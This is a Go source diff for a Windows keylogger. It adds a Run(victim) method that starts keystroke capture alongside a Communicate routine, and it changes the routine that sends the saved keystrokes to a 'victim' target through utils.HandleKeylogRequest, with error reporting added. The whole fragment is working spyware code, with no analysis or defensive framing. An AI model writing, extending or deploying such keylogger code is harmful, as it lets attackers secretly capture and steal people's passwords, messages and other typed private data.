@@ -3,7 +3,7 @@ package services
 import (
 	"fmt"
 	"github.com/TheTitanrain/w32"
-	"main/network"
+	"main/utils"
 	"strings"
 	"sync"
 	"time"
@@ -18,6 +18,11 @@ type Keylogger struct {
 	saved   string
 }
 
+func (kl *Keylogger) Run(victim string) {
+	go kl.Start()
+	go kl.Communicate(victim)
+}
+
 type Key struct {
 	keyCode int
 	changed bool
@@ -25,7 +30,6 @@ type Key struct {
 
 func (kl *Keylogger) Terminate() {
 	close(kl.Channel)
-	//
 }
 
 func (kl *Keylogger) GetKey() Key {
@@ -75,8 +79,9 @@ func (kl *Keylogger) Communicate(victim string) {
 			} else {
 				kl.Mutex.Unlock()
 				if kl.saved != "" {
-					_, err := network.HandleTextRequest(kl.saved, "/", victim)
+					_, err := utils.HandleKeylogRequest(kl.saved, victim)
 					if err != nil {
+						utils.HandleError(err.Error(), victim)
 						fmt.Println("Error making the request")
 					} else {
 						kl.saved = ""
